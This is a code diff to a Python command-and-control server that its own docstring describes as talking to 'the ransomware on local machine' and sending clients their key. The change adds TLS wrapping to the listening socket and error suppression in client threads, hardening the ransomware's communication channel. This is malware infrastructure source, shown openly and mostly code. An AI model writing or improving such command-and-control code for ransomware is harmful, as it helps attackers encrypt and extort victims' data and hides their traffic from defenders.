@@ -3,6 +3,7 @@ C&C server for communication with the ransomware on local machine
 """
 import socket, select
 import sys
+import ssl
 from threading import Thread
 from cryptography.fernet import Fernet
 
@@ -11,7 +12,7 @@ class ClientThread(Thread):
     Client thread class, responsible for making connection to clients and sending them thier key
     """
 
-    def __init__(self, host: str, port: int, conn: socket, tu) -> None:
+    def __init__(self, host: str, port: int, conn: ssl.SSLSocket, tu) -> None:
         Thread.__init__(self)
         self.host = host
         self.port = port
@@ -35,21 +36,27 @@ class ClientThread(Thread):
             
             print(f"recieved user connectinon: {data}")
             
-            self.thread_update(self, data.decode("Utf-8"))
-
+            try:
+                self.thread_update(self, data.decode("Utf-8"))
+            except:
+                continue
 
 class Server():
     """
     Server Class, manages user files and connections
     """
     def __init__(self, host: str, port: int) -> None:
+        
         """
         Mainly socket setup in the initialzer
         """
-        self.ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.ss.bind((host, port))
-        self.ss.listen(10)
+        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((host, port))
+        self.sock.listen(10)
+        self.secSock = self.context.wrap_socket(self.sock, server_side=True)
         self.host = host
         self.port = port
         self.threads = {}
@@ -84,10 +91,10 @@ class Server():
         """
         wait for connections
         """
-        r_socks, w_socks, e_socks = select.select([self.ss], [], [])
+        r_socks, w_socks, e_socks = select.select([self.secSock], [], [])
         while True:
             for sock in r_socks:
-                (conn, (self.host, self.port)) = self.ss.accept()
+                (conn, (self.host, self.port)) = self.secSock.accept()
                 new_thread = ClientThread(self.host, self.port, conn, self.thread_check)
                 new_thread.start()
             
